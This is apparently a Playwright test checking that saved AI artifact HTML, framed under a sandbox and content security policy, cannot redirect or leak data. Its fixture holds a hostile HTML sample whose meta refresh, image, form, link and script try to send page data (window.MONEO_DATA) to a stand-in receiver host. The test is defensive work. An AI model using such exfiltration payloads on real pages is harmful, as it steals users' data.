import { expect, test } from "@playwright/test";
import { ARTIFACT_FRAME_CSP, artifactDocument } from "../lib/ai/artifact-data";

test("legacy artifact HTML cannot navigate its frame or send data on load", async ({ page }) => {
  const leaked: string[] = [];
  await page.route("http://receiver.test/**", async route => { leaked.push(route.request().url()); await route.fulfill({ body: "Received" }); });
  await page.route("http://artifact.test/**", async route => {
    if (new URL(route.request().url()).pathname === "/") return route.fulfill({ contentType: "text/html", body: '<iframe sandbox="allow-scripts" src="/frame"></iframe>' });
    const html = '<html><head><meta http-equiv="refresh" content="0;url=http://receiver.test/meta"></head><body><p>Saved design</p><img src="http://receiver.test/image?saved=SYNTHETIC"><form action="http://receiver.test/form"><button>Submit</button></form><a href="http://receiver.test/link?saved=SYNTHETIC">Unsafe link</a><script>location.replace("http://receiver.test/collect?data="+encodeURIComponent(JSON.stringify(window.MONEO_DATA)))</script></body></html>';
    await route.fulfill({ contentType: "text/html", headers: { "Content-Security-Policy": ARTIFACT_FRAME_CSP }, body: artifactDocument(html, {}) });
  });
  await page.goto("http://artifact.test/");
  await page.waitForTimeout(500);
  expect(leaked).toEqual([]);
  await expect(page.frameLocator("iframe").frameLocator("iframe").getByText("Saved design")).toBeVisible();
  expect(page.frames()[1].url()).toBe("http://artifact.test/frame");
  // The response header also protects a directly opened old frame URL.
  await page.goto("http://artifact.test/frame");
  await expect(page.frameLocator("iframe").getByText("Saved design")).toBeVisible();
  await page.frameLocator("iframe").locator("a").click({ force: true });
  await page.frameLocator("iframe").locator("button").click({ force: true });
  await page.waitForTimeout(500);
  expect(leaked).toEqual([]);
});
